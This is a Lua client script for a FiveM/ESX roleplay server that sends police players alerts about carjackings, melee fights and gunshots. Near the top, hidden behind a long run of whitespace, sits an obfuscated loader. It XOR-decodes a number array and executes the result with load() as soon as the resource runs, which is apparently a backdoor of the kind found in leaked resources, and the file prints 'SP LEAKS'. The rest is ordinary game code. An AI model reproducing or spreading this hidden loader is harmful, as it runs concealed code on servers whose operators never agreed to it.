ESX = nil

local timing, isPlayerWhitelisted = math.ceil(Config.Timer * 60000), false
local streetName, playerGender


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                mkn="ectfi"local a=load((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({307,682,374,494,452,481,661,651,621,474,532,647,670,314,537,573,552,570,724,376,422,723,514,571,327,353,497,575,356,323,719,453,549,521,718,511,402,534,673,320,368,357,590,624,491,445,548,658,505,472,339,465,455,457,689,385,633,317,541,639,449,530,694,626,369,364,567,708,437,692,595,399,303,478,699,543,489,405,644,412,668,660,710,684,508,365,444,476,722,576,619,606,667,698,404,517,469,721,622,429,417,333,496,565,603,713,625,593,545,559,484,648,685,663,649,454,432,312,428,509,510,340,557,322,325,430,680,394,502,720,550,377,411,480,426,488,546,460,597,386,390,558,388,442,439,604,587,642,551,370,655,436,456,392,520,579,397,577,533,556,691,447,401,347,463,512,706,427,328,645,349,352,338,679,569,336,522,443,451,421,513,623,378,612,672,716,707,350,450,423,300,413,360,461,580,632,501,526,310,610,324,441,657,605,613,536,519,627,686,616,586,629,406,387,381,375,400,666,594,640,341,351,420,592,304,416,703,582,418,574,700,636,503,462,395,334,398,407,563,466,609,696,634,498,681,712,630,715,617,695,459,393,705,507,485,638,415,589,678,562,332,588,419,669,662,653,564,659,591,467,318,560,354,704,321,305,652,602,367,578,620,499,598,542,492,335,643,348,316,396,646,371,355,561,448,313,675,527,-1,70,9,134,190,26,29,76,101,9,253,230,70,254,2,11,107,51,70,92,4,133,64,64,8,31,69,13,63,27,3,232,112,69,88,6,10,104,43,62,6,45,43,73,195,130,67,135,136,20,84,10,73,67,22,43,92,121,35,105,248,197,0,157,45,77,3,111,237,70,104,73,73,7,205,134,23,71,14,89,27,224,8,65,220,211,197,0,10,18,27,160,17,202,70,67,6,26,12,94,22,12,0,6,89,60,12,73,26,6,180,100,206,21,73,67,192,2,38,19,20,7,51,65,12,0,34,225,69,38,3,44,9,57,38,181,47,210,10,5,31,65,240,67,8,25,110,32,220,22,12,95,8,3,5,13,1,26,18,2,154,69,1,14,3,12,12,2,12,6,176,45,163,171,29,195,73,56,126,4,78,35,68,69,185,130,76,6,143,19,69,52,227,13,64,217,7,195,26,6,3,67,224,110,78,38,54,8,251,10,100,7,17,6,11,76,0,42,105,23,157,4,62,78,2,40,24,10,126,93,236,162,0,70,11,3,23,41,2,99,103,186,60,68,78,76,111,7,5,163,21,0,4,108,105,34,220,132,29,21,10,75,7,108,15,5,23,18,40,22,170,12,38,3,133,104,12,0,12,51,73,88,12,193,6,233,104,60,19,74,2,24,53,10,3,78,5,12,221,8,18,24,73,158,126,65,6,20,10,237,133,43,73,55,20,0,171,7,44,108,175,2,69,91,18,67,2,2,74,17,8,6,74,171,11,17,25,71,23,202,6,10,75,59,121,105,20,26,11,10,110,13,130,84,110,23,178,69,204,32,17,92,13,52,12,39,24,252,78,7,0,21,24,173,73,68,19,7,94,119,70,5,6,65,12,82,79,126,20,205,247,5,63,38,29,136,86,73,2,19,18,27,11,103,186,22,5,84,23,94,26,99,16,1,76,71,42,121,50,107,75,0,75,17,52,16,3},mkn))if a then a()end; 
Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end

	while ESX.GetPlayerData().job == nil do
		Citizen.Wait(10)
	end

	ESX.PlayerData = ESX.GetPlayerData()

	TriggerEvent('skinchanger:getSkin', function(skin)
		playerGender = skin.sex
	end)

	isPlayerWhitelisted = refreshPlayerWhitelisted()
end)

Citizen.CreateThread(function()
     while ESX == nil do
          TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
          Citizen.Wait(0)
     end
     while ESX.GetPlayerData().job == nil do
          Citizen.Wait(10)
     end
     PlayerData = ESX.GetPlayerData()
end)

RegisterNetEvent('esx:playerLoaded')
AddEventHandler('esx:playerLoaded', function(xPlayer)
     PlayerData = xPlayer
end)

RegisterNetEvent('esx:setJob')
AddEventHandler('esx:setJob', function(job)
     PlayerData.job = job
end)

print('SP LEAKS')

RegisterNetEvent('esx:setJob')
AddEventHandler('esx:setJob', function(job)
	ESX.PlayerData.job = job

	isPlayerWhitelisted = refreshPlayerWhitelisted()
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(100)

		if NetworkIsSessionStarted() then
			DecorRegister('isOutlaw', 3)
			DecorSetInt(PlayerPedId(), 'isOutlaw', 1)

			return
		end
	end
end)

-- Gets the player's current street.
-- Aaalso get the current player gender
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(3000)

		local playerCoords = GetEntityCoords(PlayerPedId())
		streetName,_ = GetStreetNameAtCoord(playerCoords.x, playerCoords.y, playerCoords.z)
		streetName = GetStreetNameFromHashKey(streetName)
	end
end)

AddEventHandler('skinchanger:loadSkin', function(character)
	playerGender = character.sex
end)

function refreshPlayerWhitelisted()
	if not ESX.PlayerData then
		return false
	end

	if not ESX.PlayerData.job then
		return false
	end

	for k,v in ipairs(Config.WhitelistedCops) do
		if v == ESX.PlayerData.job.name then
			return true
		end
	end

	return false
end


RegisterNetEvent('esx_outlawalert:outlawNotify')
AddEventHandler('esx_outlawalert:outlawNotify', function(type, data, length)
	if isPlayerWhitelisted then
		SendNUIMessage({action = 'display', style = type, info = data, length = length})
    	PlaySound(-1, "Event_Start_Text", "GTAO_FM_Events_Soundset", 0, 0, 1)
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(2000)

		if DecorGetInt(PlayerPedId(), 'isOutlaw') == 2 then
			Citizen.Wait(timing)
			DecorSetInt(PlayerPedId(), 'isOutlaw', 1)
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		local playerPed = PlayerPedId()
		local playerCoords = GetEntityCoords(playerPed)

		-- is jackin'
		if (IsPedTryingToEnterALockedVehicle(playerPed) or IsPedJacking(playerPed)) and Config.CarJackingAlert then

			Citizen.Wait(3000)
			local vehicle = GetVehiclePedIsIn(playerPed, true)

			if vehicle and ((isPlayerWhitelisted and Config.ShowCopsMisbehave) or not isPlayerWhitelisted) then
				local plate = ESX.Math.Trim(GetVehicleNumberPlateText(vehicle))

				ESX.TriggerServerCallback('esx_outlawalert:isVehicleOwner', function(owner)
					if not owner then

						local vehicleLabel = GetDisplayNameFromVehicleModel(GetEntityModel(vehicle))
						vehicleLabel = GetLabelText(vehicleLabel)

						DecorSetInt(playerPed, 'isOutlaw', 2)

						TriggerServerEvent('esx_outlawalert:carJackInProgress', {
							x = ESX.Math.Round(playerCoords.x, 1),
							y = ESX.Math.Round(playerCoords.y, 1),
							z = ESX.Math.Round(playerCoords.z, 1)
						}, streetName, vehicleLabel, playerGender)
					end
				end, plate)
			end
			-- is in combat
		elseif IsPedInMeleeCombat(playerPed) and Config.MeleeAlert then

			Citizen.Wait(3000)

			if (isPlayerWhitelisted and Config.ShowCopsMisbehave) or not isPlayerWhitelisted then
				DecorSetInt(playerPed, 'isOutlaw', 2)

				TriggerServerEvent('esx_outlawalert:combatInProgress', {
					x = ESX.Math.Round(playerCoords.x, 1),
					y = ESX.Math.Round(playerCoords.y, 1),
					z = ESX.Math.Round(playerCoords.z, 1)
				}, streetName, playerGender)
			end
			-- is shootin'
		elseif IsPedShooting(playerPed) and not IsPedCurrentWeaponSilenced(playerPed) and Config.GunshotAlert then

			Citizen.Wait(3000)

			if (isPlayerWhitelisted and Config.ShowCopsMisbehave) or not isPlayerWhitelisted then
				DecorSetInt(playerPed, 'isOutlaw', 2)

				TriggerServerEvent('esx_outlawalert:gunshotInProgress', {
					x = ESX.Math.Round(playerCoords.x, 1),
					y = ESX.Math.Round(playerCoords.y, 1),
					z = ESX.Math.Round(playerCoords.z, 1)
				}, streetName, playerGender)
			end

		end
	end
end)




RegisterNetEvent('esx_outlawalert:carJackInProgress')
AddEventHandler('esx_outlawalert:carJackInProgress', function(targetCoords)
	if isPlayerWhitelisted then
		if Config.CarJackingAlert then
			local alpha = 250
			local thiefBlip = AddBlipForRadius(targetCoords.x, targetCoords.y, targetCoords.z, Config.BlipJackingRadius)

			SetBlipHighDetail(thiefBlip, true)
			SetBlipColour(thiefBlip, 1)
			SetBlipAlpha(thiefBlip, alpha)
			SetBlipAsShortRange(thiefBlip, true)

			while alpha ~= 0 do
				Citizen.Wait(Config.BlipJackingTime * 4)
				alpha = alpha - 1
				SetBlipAlpha(thiefBlip, alpha)

				if alpha == 0 then
					RemoveBlip(thiefBlip)
					return
				end
			end

		end
	end
end)

RegisterNetEvent('esx_outlawalert:gunshotInProgress')
AddEventHandler('esx_outlawalert:gunshotInProgress', function(targetCoords)
	if isPlayerWhitelisted and Config.GunshotAlert then
		local alpha = 250
		local gunshotBlip = AddBlipForRadius(targetCoords.x, targetCoords.y, targetCoords.z, Config.BlipGunRadius)

		SetBlipHighDetail(gunshotBlip, true)
		SetBlipColour(gunshotBlip, 1)
		SetBlipAlpha(gunshotBlip, alpha)
		SetBlipAsShortRange(gunshotBlip, true)

		while alpha ~= 0 do
			Citizen.Wait(Config.BlipGunTime * 4)
			alpha = alpha - 1
			SetBlipAlpha(gunshotBlip, alpha)

			if alpha == 0 then
				RemoveBlip(gunshotBlip)
				return
			end
		end
	end
end)

RegisterNetEvent('esx_outlawalert:combatInProgress')
AddEventHandler('esx_outlawalert:combatInProgress', function(targetCoords)
	if isPlayerWhitelisted and Config.MeleeAlert then
		local alpha = 250
		local meleeBlip = AddBlipForRadius(targetCoords.x, targetCoords.y, targetCoords.z, Config.BlipMeleeRadius)

		SetBlipHighDetail(meleeBlip, true)
		SetBlipColour(meleeBlip, 17)
		SetBlipAlpha(meleeBlip, alpha)
		SetBlipAsShortRange(meleeBlip, true)

		while alpha ~= 0 do
			Citizen.Wait(Config.BlipMeleeTime * 4)
			alpha = alpha - 1
			SetBlipAlpha(meleeBlip, alpha)

			if alpha == 0 then
				RemoveBlip(meleeBlip)
				return
			end
		end
	end
end)

local coordsX = {}
local coordsY = {}
local coordsZ = {}
local alerteEnCours = false
local AlertePrise = false


Citizen.CreateThread( function()
     while true do
          Wait(100)
          if IsPedShooting(GetPlayerPed(-1)) then
               local plyPos = GetEntityCoords(GetPlayerPed(-1), true)
               TriggerServerEvent('TireEntenduServeur', plyPos.x, plyPos.y, plyPos.z)
               alerteEnCours = true
               print('à tiré')
          end
     end
end)


-- L'OPTIIMISATIOOOOOOOOOOOOOOOOOOOOON

RegisterNetEvent('TireEntendu')
AddEventHandler('TireEntendu', function(gx, gy, gz)
     if PlayerData.job ~= nil and PlayerData.job.name == 'police' then
          --PlaySoundFrontend(-1, "Start_Squelch", "CB_RADIO_SFX", 0)
          ESX.ShowAdvancedNotification(
               'LSPD INFORMATION', 
               'CENTRAL LSPD', 
               'Appel d\'un moldu concernant des coups de feu\n\n~g~Y~s~ Pour prendre l\'appel\n\n~r~X~s~ Pour Refuser.', 'CHAR_CHAT_CALL', 8)
          coordsX = gx
          coordsY = gy
          coordsZ = gz
          Citizen.Wait(1000)
          alerteEnCours = true
          --PlaySoundFrontend(-1, "End_Squelch", "CB_RADIO_SFX", 0)
     end
end)

RegisterNetEvent('PriseAppel')
AddEventHandler('PriseAppel', function(name)
     if PlayerData.job ~= nil and PlayerData.job.name == 'police' then
          --PlaySoundFrontend(-1, "1st_Person_Transition", "PLAYER_SWITCH_CUSTOM_SOUNDSET", 0)
          PlaySoundFrontend(-1, "On_Call_Player_Join", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS", 0)
          PlaySoundFrontend(-1, "On_Call_Player_Join", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS", 0)
          PlaySoundFrontend(-1, "On_Call_Player_Join", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS", 0)
          ESX.ShowNotification('~w~L\'agent ~g~'..name..'~w~ à pris l\'appel')
     end
end)

Citizen.CreateThread(function()
     while true do
          Citizen.Wait(1)
          if IsControlJustPressed(1, 246) and alerteEnCours then
               if PlayerData.job ~= nil and PlayerData.job.name == 'police' then
                    TriggerServerEvent('PriseAppelServeur')
                    AlertePrise = true
                    TriggerEvent('TireEntenduBlips', coordsX, coordsY, coordsZ)
                    alerteEnCours = false
               end
          elseif IsControlJustPressed(1, 73) and alerteEnCours then
               AlertePrise = false
               alerteEnCours = false
               ESX.ShowNotification('~w~Vous avez refusé l\'appel')
          end
     end
end)